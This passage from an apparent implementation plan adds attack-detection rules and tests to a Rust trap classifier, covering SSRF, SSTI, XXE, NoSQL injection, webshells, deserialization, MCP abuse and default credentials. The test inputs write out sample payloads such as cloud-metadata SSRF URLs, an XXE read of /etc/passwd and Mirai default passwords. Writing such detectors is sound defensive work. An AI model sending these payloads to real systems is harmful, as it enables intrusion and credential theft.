# %252e%252e into ../ / ..\ / .. before matching, and the raw alternatives
# below catch the encoded forms directly too.

[[rule]]
label = "path-traversal"
weight = 4
owasp = ["A01:2021"]
target_regex = "\\.\\.(/|\\\\|%2f|%5c)|%2e%2e|\\.\\.(\\\\|/)|\\.\\.;|(php|expect|phar|zip)://|/etc/passwd|/etc/(shadow|issue)|/proc/self|/proc/(version|cpuinfo)|win\\.ini|boot\\.ini"
```

`rules/rce.toml`: add `owasp = ["A03:2021"]` to every one of the six `[[rule]]` blocks, and change the first rule's `;\s*(id|whoami|uname|cat\s+/etc)\b` alternative to `;\s*(id|whoami|uname|wget|curl|busybox|chmod|tftp|cat\s+/etc)\b` (mirroring the body rule's dropper chain). All other content unchanged.

`rules/paths.toml`: add `owasp = ["OAT-018"]` to all three existing rules, then append:

```toml
[[rule]]
label = "sensitive-path"
weight = 2
owasp = ["OAT-018"]
# Backup and dump files: database exports, site archives, one-shot names
# (/1.zip) scanners spray for.
target_regex = "/(backup|db|database|dump|mysql|www|wwwroot|site|website|web|htdocs|public_html|old|bak|1)(\\.(sql|zip|tar|tar\\.gz|tgz|7z|rar|bak|old))+(/|\\?|$)"

[[rule]]
label = "sensitive-path"
weight = 2
owasp = ["OAT-018"]
# Framework debug surfaces and deployment secrets: Symfony, Laravel, Yii,
# ASP.NET error logs, Go expvar, Terraform and Kubernetes state, SSH keys.
target_regex = "/(_profiler|telescope|horizon)(/|\\?|$)|/app_dev\\.php|/(elmah|trace)\\.axd|/debug/(vars|default|toolbar)(/|\\?|$)|/web\\.config(/|\\?|$)|/composer\\.(json|lock)(/|\\?|$)|/\\.terraform(/|\\?|$)|/terraform\\.tfstate|/\\.kube/config|/id_(rsa|dsa|ecdsa|ed25519)(/|\\.|\\?|$)|/(server|private)\\.key(/|\\?|$)|/\\.(pgpass|netrc)(/|\\?|$)"
```

`rules/appliances.toml`: add `owasp = ["OAT-014"]` to all three rules, and extend the iot rule's `target_regex` to:

```toml
target_regex = '''/hnap1(/|\?|$)|/boaform/|/gponform/|/picsdesc\.xml|/ctrlt/DeviceUpgrade|/setup\.cgi(/|\?|$)|/tmUnblock\.cgi|/JNAP/|/SDK/webLanguage|/doc/page/login|/RPC2_Login|/current_config(/|\?|$)'''
```

`rules/scanners.toml` (full replacement — split tooling from research):

```toml
# Tools that announce themselves in the User-Agent (OAT-004), and research
# scanners that measure the internet (OAT-018). httpx is ProjectDiscovery's
# probe; python-httpx (a general HTTP library) is not matched.
[[rule]]
label = "scanner-ua"
weight = 2
owasp = ["OAT-004"]
ua_regex = '''sqlmap|nikto|nmap|masscan|nuclei|acunetix|nessus|openvas|wpscan|dirbuster|gobuster|hydra|metasploit|zgrab|zmap|\bffuf\b|fuzz faster u fool|feroxbuster|wfuzz|\bdirb\b|(^|[^-\w])httpx\b|projectdiscovery'''

[[rule]]
label = "research-scanner"
weight = 2
owasp = ["OAT-018"]
ua_regex = '''censysinspect|\bexpanse\b|xpanse|l9explore|l9tcpid|leakix|binaryedge|shadowserver|stretchoid|onyphe|internet-measurement'''
```

- [ ] **Step 4: Register the UA labels in the label color map**

`scanner-ua` and `research-scanner` do not end in `-probe`, so the suffix rule does not cover them. In `src/admin/views.rs` `label_class`, add a dedicated arm before the `_` fallback:

```rust
        "scanner-ua" | "research-scanner" => "badge-cat-recon",
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cargo test classify admin`
Expected: PASS — new corpus tests green, existing corpus unchanged.

- [ ] **Step 6: Commit**

```bash
git add rules/sqli.toml rules/xss.toml rules/traversal.toml rules/rce.toml rules/paths.toml rules/appliances.toml rules/scanners.toml src/classify/mod.rs src/admin/views.rs
git commit -m "feat(classify): owasp tags and broader coverage in the existing rule families"
```

---

### Task 6: New families — SSRF and injection variants

**Files:**
- Create: `rules/ssrf.toml`
- Create: `rules/injection.toml`
- Test: `src/classify/mod.rs` tests module

**Interfaces:**
- Consumes: the engine as of Task 1 (raw + decoded matching on target/body).
- Produces: labels `ssrf` (4), `ssti` (4), `nosqli` (4), `xxe` (4), `crlf-injection` (3) — all covered by `label_class` already (`badge-cat-impact` / `badge-cat-inject`).

- [ ] **Step 1: Write the failing corpus tests**

In `src/classify/mod.rs` tests module, add:

```rust
    #[test]
    fn ssrf_to_cloud_metadata_is_level_4() {
        for q in [
            "url=http://169.254.169.254/latest/meta-data/",
            "u=http%3a%2f%2fmetadata.google.internal%2f",
            "next=http://169.254.170.2/v2/credentials",
            "feed=http://100.100.100.200/latest/meta-data/",
        ] {
            let v = classifier().classify(&view("GET", "/fetch", Some(q), "curl/8", None), &hist(1, 1), &BotTells::default());
            assert!(v.labels.iter().any(|l| l == "ssrf"), "{q}: {:?}", v.labels);
            assert_eq!(v.scan_level, 4);
        }
    }

    #[test]
    fn ssrf_params_to_internal_hosts_but_not_plain_paths() {
        for q in [
            "url=http://127.0.0.1:8080/",
            "callback=http://192.168.1.1/",
            "webhook=http://2130706433/",
            "u=http://0x7f000001/",
            "image=http://10.0.0.4/x",
        ] {
            let v = classifier().classify(&view("GET", "/proxy", Some(q), "curl/8", None), &hist(1, 1), &BotTells::default());
            assert!(v.labels.iter().any(|l| l == "ssrf"), "{q}: {:?}", v.labels);
        }
        // A private IP in a path, or in an unrelated parameter, is not SSRF.
        for (p, q) in [("/blog/192.168.1.1-release", None), ("/fetch", Some("name=127.0.0.1"))] {
            let v = classifier().classify(&view("GET", p, q, "Mozilla/5.0", None), &hist(1, 1), &BotTells::default());
            assert!(!v.labels.iter().any(|l| l == "ssrf"), "{p} {q:?}: {:?}", v.labels);
        }
    }

    #[test]
    fn ssti_probes_are_level_4() {
        for q in ["q={{7*7}}", "q=%7b%7bconfig%7d%7d", "q=${7*7}", "q=<%=7*7%>", "q={{request.application.__globals__}}"] {
            let v = classifier().classify(&view("GET", "/search", Some(q), "curl/8", None), &hist(1, 1), &BotTells::default());
            assert!(v.labels.iter().any(|l| l == "ssti"), "{q}: {:?}", v.labels);
            assert_eq!(v.scan_level, 4);
        }
    }

    #[test]
    fn nosqli_operators_are_caught() {
        for q in ["user[$ne]=1", "user[$gt]="] {
            let v = classifier().classify(&view("GET", "/login", Some(q), "curl/8", None), &hist(1, 1), &BotTells::default());
            assert!(v.labels.iter().any(|l| l == "nosqli"), "{q}: {:?}", v.labels);
        }
        for b in [&b"{\"$where\": \"1==1\"}"[..], &b"{\"user\": {\"$gt\": \"\"}}"[..]] {
            let v = classifier().classify(&view("POST", "/login", None, "curl/8", Some(b)), &hist(1, 1), &BotTells::default());
            assert!(v.labels.iter().any(|l| l == "nosqli"), "{b:?}: {:?}", v.labels);
        }
    }

    #[test]
    fn xxe_in_a_body_is_caught() {
        let b = br#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>"#;
        let v = classifier().classify(&view("POST", "/xml", None, "curl/8", Some(b)), &hist(1, 1), &BotTells::default());
        assert!(v.labels.iter().any(|l| l == "xxe"), "{:?}", v.labels);
        assert_eq!(v.scan_level, 4);
    }

    #[test]
    fn crlf_in_the_target_is_caught() {
        let v = classifier().classify(
            &view("GET", "/redir", Some("next=a%0d%0aSet-Cookie:%20x"), "curl/8", None),
            &hist(1, 1),
            &BotTells::default(),
        );
        assert!(v.labels.iter().any(|l| l == "crlf-injection"), "{:?}", v.labels);
        assert_eq!(v.scan_level, 3);
        let plain = classifier().classify(&view("GET", "/redir", Some("next=/home"), "Mozilla/5.0", None), &hist(1, 1), &BotTells::default());
        assert!(!plain.labels.iter().any(|l| l == "crlf-injection"), "{:?}", plain.labels);
    }
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cargo test classify`
Expected: the six new tests FAIL (labels missing).

- [ ] **Step 3: Create the rule files**

`rules/ssrf.toml`:

```toml
# Server-side request forgery (A10:2021). Matched raw and percent-decoded,
# so encoded targets (%3a%2f%2f, %31%32%37…) are caught. Weight 4: asking a
# server to fetch cloud metadata or an internal address is the exploit.

[[rule]]
label = "ssrf"
weight = 4
owasp = ["A10:2021"]
# Cloud metadata and link-local services, anywhere in the target: AWS,
# GCP, the ECS task-credentials endpoint, Alibaba Cloud.
target_regex = '''169\.254\.(169\.254|170\.2)|metadata\.google\.internal|100\.100\.100\.200|\[fd00:ec2::254\]|instance-data(/|\?|$)'''

[[rule]]
label = "ssrf"
weight = 4
owasp = ["A10:2021"]
# URL-ish parameters aimed at loopback or private space, including decimal
# and hex IP forms (2130706433, 0x7f000001, 0177.0.0.1). The parameter name
# anchors the match, so /blog/192.168.1.1-release does not fire.
target_regex = '''[?&](url|uri|link|target|dest|destination|redirect|next|callback|feed|host|site|src|source|proxy|image|img|load|fetch|domain|endpoint|webhook|data|path|page|view|file|ref|return|goto|to|u|href)=[^&]{0,2000}(localhost|127\.0\.0\.1|127\.[0-9]|0\.0\.0\.0|0x7f|2130706433|0177\.|10\.[0-9]|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.|\[::1\]|169\.254\.)'''
```

`rules/injection.toml`:

```toml
# Injection families beyond SQLi and XSS (all A03:2021). Weight 4 for clear
# payloads, 3 for the CRLF probe (it needs an application bug to become an
# exploit).

[[rule]]
label = "ssti"
weight = 4
owasp = ["A03:2021"]
# Server-side template injection: arithmetic or object walks inside the
# markers of the major engines — Jinja2/Twig {{ }}, FreeMarker/Mako ${ },
# Spring/EL #{ }, ERB <%= %>. ${…} overlaps the Log4Shell rules on purpose;
# both labels firing is correct.
target_regex = '''\{\{[^}]{0,64}(\*|\bconfig\b|\bself\b|__|\brequest\b|cycler|joiner|namespace|lipsum)|\$\{\s*[0-9]+\s*[*+\-/]|#\{\s*[0-9]+\s*[*+\-/]|<%=\s*[0-9]+\s*[*+\-/]'''
body_regex = '''\{\{[^}]{0,64}(\*|\bconfig\b|\bself\b|__|\brequest\b|cycler|joiner|namespace|lipsum)|\$\{\s*[0-9]+\s*[*+\-/]|#\{\s*[0-9]+\s*[*+\-/]|<%=\s*[0-9]+\s*[*+\-/]'''

[[rule]]
label = "nosqli"
weight = 4
owasp = ["A03:2021"]
# MongoDB-style operator injection: ?user[$ne]=1 in a query string, and
# {"$gt": …} / $where in JSON bodies.
target_regex = '''\[\$(ne|eq|gte?|lte?|in|nin|regex|where|exists|or|and|not)\]\s*=|\$(where|regex)\s*[=:]'''
body_regex = '''["']?\$(ne|eq|gte?|lte?|in|nin|regex|where|exists)["']?\s*:|\$where\s*[:=]|\|\|\s*1\s*==\s*1'''

[[rule]]
label = "xxe"
weight = 4
owasp = ["A03:2021"]
# XML external entities: a DOCTYPE declaring entities, SYSTEM/PUBLIC
# identifiers pointing at files or URLs, parameter entities.
body_regex = '''<!doctype[^>]{0,512}\[|<!entity[^>]{0,512}(system|public)|\b(system|public)\s+["'](file|php|expect|https?|ftp):'''

[[rule]]
label = "crlf-injection"
weight = 3
owasp = ["A03:2021"]
# Encoded or literal CR/LF in the request target: response splitting and
# log-injection probes. %0a alone counts too — it has no place in a URL.
target_regex = "%0d%0a|%0a%0d|%0d|%0a|\\r\\n"
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cargo test classify`
Expected: PASS — new corpus green, existing corpus unchanged.

- [ ] **Step 5: Commit**

```bash
git add rules/ssrf.toml rules/injection.toml src/classify/mod.rs
git commit -m "feat(classify): ssrf and injection (ssti, nosqli, xxe, crlf) rule families"
```

---

### Task 7: New families — webshells and deserialization

**Files:**
- Create: `rules/webshells.toml`
- Create: `rules/deserialization.toml`
- Test: `src/classify/mod.rs` tests module

**Interfaces:**
- Consumes: the engine as of Task 1.
- Produces: labels `webshell-probe` (3), `webshell` (4), `deserialization` (4) — all covered by `label_class` already.

- [ ] **Step 1: Write the failing corpus tests**

In `src/classify/mod.rs` tests module, add:

```rust
    #[test]
    fn webshell_probes_are_level_3_and_interaction_is_level_4() {
        for p in [
            "/shell.php", "/alfa.php", "/wso.php", "/c99.php", "/x.php", "/1.php",
            "/wp-content/uploads/evil.php", "/.well-known/shell.phtml", "/images/cmd.php",
        ] {
            let v = classifier().classify(&view("GET", p, None, "curl/8", None), &hist(1, 1), &BotTells::default());
            assert!(v.labels.iter().any(|l| l == "webshell-probe"), "{p}: {:?}", v.labels);
            assert_eq!(v.scan_level, 3, "{p}");
        }
        for (p, q) in [("/shell.php", "cmd=id"), ("/index.php", "z0=aWQ9")] {
            let v = classifier().classify(&view("GET", p, Some(q), "curl/8", None), &hist(1, 1), &BotTells::default());
            assert!(v.labels.iter().any(|l| l == "webshell"), "{p}?{q}: {:?}", v.labels);
            assert_eq!(v.scan_level, 4, "{p}?{q}");
        }
        // A generic script with a generic parameter is not a webshell.
        let v = classifier().classify(&view("GET", "/index.php", Some("action=edit"), "Mozilla/5.0", None), &hist(1, 1), &BotTells::default());
        assert!(!v.labels.iter().any(|l| l == "webshell"), "{:?}", v.labels);
    }

    #[test]
    fn deserialization_markers_are_level_4() {
        let v = classifier().classify(
            &view("GET", "/api", Some("data=rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0"), "curl/8", None),
            &hist(1, 1),
            &BotTells::default(),
        );
        assert!(v.labels.iter().any(|l| l == "deserialization"), "{:?}", v.labels);
        let v = classifier().classify(
            &view("GET", "/api", Some("payload=aced0005sr"), "curl/8", None),
            &hist(1, 1),
            &BotTells::default(),
        );
        assert!(v.labels.iter().any(|l| l == "deserialization"), "{:?}", v.labels);
        for b in [
            &br#"O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}"#[..],
            &br#"{"rce":"_$$ND_FUNC$$_function(){return 1}"}"#[..],
        ] {
            let v = classifier().classify(&view("POST", "/api", None, "curl/8", Some(b)), &hist(1, 1), &BotTells::default());
            assert!(v.labels.iter().any(|l| l == "deserialization"), "{b:?}: {:?}", v.labels);
        }
        // Accepted magic-bytes cost: a word containing rO0AB trips the Java
        // signature. Pinned as a positive assertion so any future tightening
        // is a deliberate act, not an accident.
        let v = classifier().classify(&view("GET", "/order", Some("status=rO0ABort"), "Mozilla/5.0", None), &hist(1, 1), &BotTells::default());
        assert!(v.labels.iter().any(|l| l == "deserialization"), "{:?}", v.labels);
    }
```

(Note: the last case documents an accepted magic-bytes false positive as a
positive assertion — it is a regression marker, not a requirement to fix.)

- [ ] **Step 2: Run tests to verify they fail**

Run: `cargo test classify`
Expected: the two new tests FAIL.

- [ ] **Step 3: Create the rule files**

`rules/webshells.toml`:

```toml
# Webshells (A08:2021). Probing for a shell's existence is exploit-adjacent
# (weight 3); talking to one — a shell name plus a command parameter, or
# China Chopper's z0/z1/z2 — is post-exploitation (weight 4).

[[rule]]
label = "webshell-probe"
weight = 3
owasp = ["A08:2021"]
# Known shell filenames and shells dropped where uploads land: generic
# short names (x.php, 1.php, up.php) are what scanners spray for, and on a
# trap there is no legitimate /x.php.
target_regex = '''/(x|1|2|3|aa|aaa|abc|alfa|b374k|backdoor|bash|bd|c99|cmd|cong|death|exec|hack|hacker|leaf|mini|r57|root|sh3ll|shell|shellz|small|up|upload|uploader|wso|wsoshell|xxx)\.(php[3457]?|phtml|phar|asp|aspx|ashx|jsp|jspx|cgi|pl|py)(/|\?|$)|/wp-content/uploads?/[^/\s]+\.(php[3457]?|phtml)(/|\?|$)|/(images?|img|files?|uploads?|tmp|cache|assets)/[^/\s]+\.(php[3457]?|phtml|jspx?)(/|\?|$)|/\.well-known/[^/\s]+\.(php[3457]?|phtml|asp|aspx)(/|\?|$)'''

[[rule]]
label = "webshell"
weight = 4
owasp = ["A08:2021"]
# Shell interaction: a known shell name plus a command parameter, or the
# China Chopper parameter names z0/z1/z2 on any script. A generic
# /index.php?action=edit does not match.
target_regex = '''/(x|1|2|aa|aaa|alfa|b374k|c99|cmd|cong|exec|hack|r57|sh3ll|shell|shellz|small|up|upload|wso|root|backdoor)\.(php[3457]?|phtml|asp|aspx|jsp|cgi|pl)\?[^ ]{0,500}(cmd|c|exec|command|act|do|pass|pwd)=|\.(php[3457]?|phtml|asp|aspx|jsp)\?([^ ]{0,500}[&?])?(z0|z1|z2)='''
```

`rules/deserialization.toml`:

```toml
# Insecure deserialization (A08:2021): serialized-object magic bytes and
# markers in the target or body. Weight 4 — there is no innocent reason to
# POST a Java serialization stream to a trap.

[[rule]]
label = "deserialization"
weight = 4
owasp = ["A08:2021"]
# Java (rO0AB base64, AC ED 00 05 hex), .NET BinaryFormatter (AAEAAAD),
# PHP objects, pickle opcode streams, Node func-serialization. rO0AB is a
# three-byte magic: a word containing it is the accepted cost.
target_regex = '''rO0AB|aced0005|AAEAAAD|O:\d+:"[^"]{1,64}":\d+:\{|_\$\$ND_FUNC\$\$_|__reduce__'''
body_regex = '''rO0AB|\\xac\\xed\\x00\\x05|aced0005|AAEAAAD|O:\d+:"[^"]{1,64}":\d+:\{|_\$\$ND_FUNC\$\$_|__reduce__|c(system|posix|nt|__builtin__)\n'''
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cargo test classify`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add rules/webshells.toml rules/deserialization.toml src/classify/mod.rs
git commit -m "feat(classify): webshell and deserialization rule families"
```

---

### Task 8: New families — AI infrastructure / MCP and cloud control planes

**Files:**
- Create: `rules/ai.toml`
- Create: `rules/cloud.toml`
- Test: `src/classify/mod.rs` tests module

**Interfaces:**
- Consumes: the engine as of Task 1.
- Produces: labels `ai-infra-probe` (2), `mcp-probe` (3), `mcp-abuse` (4), `cloud-infra-probe` (3) — all covered by `label_class` already.

- [ ] **Step 1: Write the failing corpus tests**

In `src/classify/mod.rs` tests module, add:

```rust
    #[test]
    fn ai_infrastructure_probes_are_level_2() {
        for p in [
            "/v1/models", "/v1/chat/completions", "/api/generate", "/api/tags", "/api/chat",
            "/tree", "/api/terminals", "/gradio_api/info", "/api/2.0/mlflow/experiments/list",
            "/.well-known/ai-plugin.json", "/model.safetensors", "/collections", "/v1/schema",
            "/api/v1/chatflows", "/console/api/setup", "/rest/credentials",
        ] {
            let v = classifier().classify(&view("GET", p, None, "curl/8", None), &hist(1, 1), &BotTells::default());
            assert!(v.labels.iter().any(|l| l == "ai-infra-probe"), "{p}: {:?}", v.labels);
            assert_eq!(v.scan_level, 2, "{p}");
        }
    }

    #[test]
    fn mcp_probes_are_level_3_and_abuse_is_level_4() {
        let v = classifier().classify(&view("GET", "/mcp", None, "curl/8", None), &hist(1, 1), &BotTells::default());
        assert!(v.labels.iter().any(|l| l == "mcp-probe"), "{:?}", v.labels);
        assert_eq!(v.scan_level, 3);
        let b = br#"{"jsonrpc":"2.0","id":1,"method":"tools/list"}"#;
        let v = classifier().classify(&view("POST", "/mcp", None, "curl/8", Some(b)), &hist(1, 1), &BotTells::default());
        assert!(v.labels.iter().any(|l| l == "mcp-probe"), "{:?}", v.labels);
        let b = br#"{"jsonrpc":"2.0","id":1,"method":"resources/read","params":{"uri":"file:///etc/passwd"}}"#;
        let v = classifier().classify(&view("POST", "/mcp", None, "curl/8", Some(b)), &hist(1, 1), &BotTells::default());
        assert!(v.labels.iter().any(|l| l == "mcp-abuse"), "{:?}", v.labels);
        assert_eq!(v.scan_level, 4);
    }

    #[test]
    fn cloud_control_plane_probes_are_level_3() {
        for p in [
            "/api/v1/namespaces", "/api/v1/pods", "/api/v1/secrets",
            "/_ping", "/v1.24/containers/json", "/v1/agent/self",
            "/v1/sys/seal-status", "/v2/keys/", "/config_dump",
        ] {
            let v = classifier().classify(&view("GET", p, None, "curl/8", None), &hist(1, 1), &BotTells::default());
            assert!(v.labels.iter().any(|l| l == "cloud-infra-probe"), "{p}: {:?}", v.labels);
            assert_eq!(v.scan_level, 3, "{p}");
        }
        // A generic application API is not the Kubernetes API.
        let v = classifier().classify(&view("GET", "/api/v1/users", None, "Mozilla/5.0", None), &hist(1, 1), &BotTells::default());
        assert!(!v.labels.iter().any(|l| l == "cloud-infra-probe"), "{:?}", v.labels);
    }
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cargo test classify`
Expected: the three new tests FAIL.

- [ ] **Step 3: Create the rule files**

`rules/ai.toml`:

```toml
# AI infrastructure and the Model Context Protocol — conservative by design:
# paths and wire methods only. No prompt-injection content matching, and no
# AI-crawler User-Agents (those belong to the verified-crawler module).
# Probing what a server runs is recon (weight 2, OAT-004); speaking MCP to
# it is interaction (weight 3); driving its tools at files or internal
# addresses is exploitation (weight 4, A01:2021).

[[rule]]
label = "ai-infra-probe"
weight = 2
owasp = ["OAT-004"]
# LLM serving APIs: OpenAI-compatible /v1/*, Ollama /api/*. Anchored at the
# root. /api/tags also names a blog taxonomy endpoint — accepted as the
# family's one naming-collision risk (a wrong label, nothing more).
target_regex = '''^/v1/(models|chat/completions|completions|embeddings|moderations|images|audio|responses|messages)(/|\?|$)|^/api/(tags|generate|chat|show|ps|version|embeddings|embed|pull|create|delete|copy|blobs)(/|\?|$)|^/(ollama|openai)(/|\?|$)|^/\.well-known/ai-plugin\.json'''

[[rule]]
label = "ai-infra-probe"
weight = 2
owasp = ["OAT-004"]
# Notebooks, UIs and MLOps: Jupyter, Gradio, MLflow, LiteLLM-style proxies,
# Open WebUI, Flowise, Dify, n8n.
target_regex = '''^/(tree|notebooks|terminals|lab|hub)(/|\?|$)|^/api/(terminals|kernels|sessions|contents|kernelspecs)(/|\?|$)|/gradio_api(/|\?|$)|/queue/join|^/api/2\.0/(mlflow|preview)/|/(litellm|one-api|new-api)(/|\?|$)|^/api/v1/(auths|chatflows|assistants)(/|\?|$)|^/console/api/|^/rest/(workflows|credentials)(/|\?|$)'''

[[rule]]
label = "ai-infra-probe"
weight = 2
owasp = ["OAT-004"]
# Vector databases (Chroma, Qdrant, Weaviate) and model artifacts.
target_regex = '''^/api/v[12]/(collections|heartbeat|tenants|databases)(/|\?|$)|^/collections(/|\?|$)|^/(v1/)?(schema|objects|meta)(/|\?|$)|\.(gguf|safetensors|ckpt|onnx|tflite|pth|h5|pkl)(\?|$)|/(pytorch_model|model)\.(json|safetensors|pkl)(\?|$)'''

[[rule]]
label = "mcp-probe"
weight = 3
owasp = ["OAT-004"]
# MCP endpoint discovery and the JSON-RPC methods an MCP client speaks.
# tools/list enumerates what the server offers.
target_regex = '''^/(mcp|sse|messages)(/|\?|$)|^/\.well-known/mcp(/|\?|$)'''
body_regex = '''"method"\s*:\s*"(initialize|notifications/initialized|tools/list|tools/call|resources/list|resources/read|prompts/list|prompts/get|ping)"'''

[[rule]]
label = "mcp-abuse"
weight = 4
owasp = ["A01:2021"]
# MCP tool/resource abuse: reading files or internal addresses through the
# server — resources/read with a file:// URI, tool calls aimed at loopback
# or the cloud metadata address.
body_regex = '''"(resources/read|tools/call)"[^}]{0,4096}(file://|127\.0\.0\.1|localhost|169\.254\.)|"(uri|url|path|file|filename)"\s*:\s*"(file://|/etc/|/proc/|\.\./)'''
```

`rules/cloud.toml`:

```toml
# Cloud and container control planes (A05:2021): an exposed orchestrator
# API is a critical misconfiguration, and probing for one is targeted, so
# these are weight 3. Alternatives are anchored and specific — /api/v1/users
# is an application API, not the Kubernetes API.

[[rule]]
label = "cloud-infra-probe"
weight = 3
owasp = ["A05:2021"]
# Kubernetes (juicy objects at the root), Docker Engine, Consul, Vault,
# etcd, Envoy admin.
target_regex = '''^/api/v1/(namespaces|pods|nodes|secrets|serviceaccounts|configmaps|persistentvolumeclaims)(/|\?|$)|^/apis/(apps|rbac\.authorization\.k8s\.io|batch|networking\.k8s\.io)(/|\?|$)|^/(_ping|v1\.[0-9]{1,2}/(containers|images|info|version|networks|volumes|exec))(/|\?|$)|^/v1/(agent|catalog|kv|acl)(/|\?|$)|^/v1/sys/(health|seal-status|mounts|auth)(/|\?|$)|^/v[23]/(keys|kv|auth)(/|\?|$)|^/(config_dump|clusters|listeners|server_info)(/|\?|$)'''
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cargo test classify`
Expected: PASS. Watch `cloud_control_plane_probes_are_level_3` for interactions: if `/_ping` or another case unexpectedly also matches another family, the label assertion still holds but a `scan_level` assertion above 3 would fail — that indicates an unwanted overlap to fix in the pattern, not in the test.

- [ ] **Step 5: Commit**

```bash
git add rules/ai.toml rules/cloud.toml src/classify/mod.rs
git commit -m "feat(classify): ai-infrastructure, mcp and cloud control-plane rule families"
```

---

### Task 9: New families — API recon, credential attacks, CMS/app probes

**Files:**
- Create: `rules/api.toml`
- Create: `rules/auth.toml`
- Create: `rules/cms.toml`
- Test: `src/classify/mod.rs` tests module

**Interfaces:**
- Consumes: the engine as of Task 1.
- Produces: labels `api-recon` (2), `graphql-introspection` (3), `credential-attack` (3), `app-probe` (3) — all covered by `label_class` already.

- [ ] **Step 1: Write the failing corpus tests**

In `src/classify/mod.rs` tests module, add:

```rust
    #[test]
    fn api_recon_and_graphql_introspection() {
        for p in ["/graphql", "/swagger/v1/swagger.json", "/openapi.json", "/api-docs", "/redoc", "/graphiql"] {
            let v = classifier().classify(&view("GET", p, None, "curl/8", None), &hist(1, 1), &BotTells::default());
            assert!(v.labels.iter().any(|l| l == "api-recon"), "{p}: {:?}", v.labels);
            assert_eq!(v.scan_level, 2, "{p}");
        }
        let v = classifier().classify(
            &view("GET", "/graphql", Some("query={__schema{types{name}}}"), "curl/8", None),
            &hist(1, 1),
            &BotTells::default(),
        );
        assert!(v.labels.iter().any(|l| l == "graphql-introspection"), "{:?}", v.labels);
        assert_eq!(v.scan_level, 3);
        let b = br#"{"query":"query IntrospectionQuery { __schema { types { name } } }"}"#;
        let v = classifier().classify(&view("POST", "/graphql", None, "curl/8", Some(b)), &hist(1, 1), &BotTells::default());
        assert!(v.labels.iter().any(|l| l == "graphql-introspection"), "{:?}", v.labels);
    }

    #[test]
    fn default_credentials_are_a_credential_attack() {
        for b in [
            &b"username=admin&password=admin"[..],
            &b"login=root&pwd=t0talc0ntr0l4%21"[..],
            &b"user=ubnt&pass=ubnt"[..],
        ] {
            let v = classifier().classify(&view("POST", "/login", None, "curl/8", Some(b)), &hist(1, 1), &BotTells::default());
            assert!(v.labels.iter().any(|l| l == "credential-attack"), "{b:?}: {:?}", v.labels);
        }
        // base64 admin:admin in an Authorization header.
        let req = RequestView {
            method: "GET",
            path: "/manager/html",
            query: None,
            headers: vec![("authorization".into(), "Basic YWRtaW46YWRtaW4=".into())],
            body: None,
            proxy_target: None,
        };
        let v = classifier().classify(&req, &hist(1, 1), &BotTells::default());
        assert!(v.labels.iter().any(|l| l == "credential-attack"), "{:?}", v.labels);
        // A unique password is not a default-credential attack.
        let v = classifier().classify(
            &view("POST", "/login", None, "Mozilla/5.0", Some(b"username=a&password=xK9%21mQ2")),
            &hist(1, 1),
            &BotTells::default(),
        );
        assert!(!v.labels.iter().any(|l| l == "credential-attack"), "{:?}", v.labels);
    }

    #[test]
    fn app_probes_are_level_3() {
        for p in [
            "/wls-wsat/CoordinatorPortType", "/console/css/",
            "/script", "/user/register?element_parents=account/mail/%23value",
            "/index.php?option=com_users", "/downloader/", "/app/etc/local.xml",
            "/setup/setupadministrator/", "/app/rest/users/id:1/tokens/RPC2",
            "/webtools/control/main", "/CFIDE/administrator/", "/_layouts/15/",
            "/zimbraAdmin/", "/struts/login.action", "/solr/admin/cores", "/geoserver/web/",
        ] {
            let (path, query) = p.split_once('?').map(|(a, b)| (a, Some(b))).unwrap_or((p, None));
            let v = classifier().classify(&view("GET", path, query, "curl/8", None), &hist(1, 1), &BotTells::default());
            assert!(v.labels.iter().any(|l| l == "app-probe"), "{p}: {:?}", v.labels);
            assert_eq!(v.scan_level, 3, "{p}");
        }
        // A plural users path is not Drupal's /user/*.
        let v = classifier().classify(&view("GET", "/users/register", None, "Mozilla/5.0", None), &hist(1, 1), &BotTells::default());
        assert!(!v.labels.iter().any(|l| l == "app-probe"), "{:?}", v.labels);
    }
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cargo test classify`
Expected: the three new tests FAIL.

- [ ] **Step 3: Create the rule files**

`rules/api.toml`:

```toml
# API discovery (OAT-004). Asking what the API looks like is recon (weight
# 2); pulling the GraphQL schema is interaction that maps every type and
# field (weight 3).

[[rule]]
label = "api-recon"
weight = 2
owasp = ["OAT-004"]
# Schema and documentation endpoints: GraphQL, Swagger/OpenAPI, the common
# documentation UIs.
target_regex = '''/graphql(/|\?|$)|/(swagger|openapi)[^/\s]{0,32}\.(json|ya?ml)|/(swagger-ui|api-docs|v[23]/api-docs|redoc|rapidoc|graphql-playground|graphiql|altair)(/|\?|$)'''

[[rule]]
label = "graphql-introspection"
weight = 3
owasp = ["OAT-004"]
target_regex = '''__schema|__type\b|IntrospectionQuery|query\s*[=:]?\s*\{\s*__'''
body_regex = '''__schema|__type\b|IntrospectionQuery'''
```

`rules/auth.toml`:

```toml
# Credential attacks (OAT-008, A07:2021): default and botnet credential
# pairs. Weight 3 — like any form interaction, but the defaults make the
# intent unambiguous. A unique password is not matched.

[[rule]]
label = "credential-attack"
weight = 3
owasp = ["OAT-008", "A07:2021"]
# Default and Mirai/IoT credential pairs in a form body (user field first,
# the common order). t0talc0ntr0l4! and ants1q are Mirai's telnet defaults.
body_regex = '''(user(name)?|login|uname|uid)=[^&]{0,64}&(pass(word)?|pwd)=(admin|root|password|password1|1234|12345|123456|12345678|admin123|ubnt|default|changeme|t0talc0ntr0l4!|antslq|xc3511|vizxv|toor)(&|$)'''

[[rule]]
label = "credential-attack"
weight = 3
owasp = ["OAT-008", "A07:2021"]
# HTTP Basic with the classic defaults, base64: admin:admin, root:root,
# admin:password.
header_regex = '''authorization:\s*basic\s+(YWRtaW46YWRtaW4=|cm9vdDpyb290|YWRtaW46cGFzc3dvcmQ=)'''
```

`rules/cms.toml`:

```toml
# Application and CMS exploitation recon (A06:2021): known consoles, plugin
# APIs and CVE-target paths. Existence probes are weight 3; the payloads
# sent to them are caught by the rce/sqli rules at weight 4. Anchored
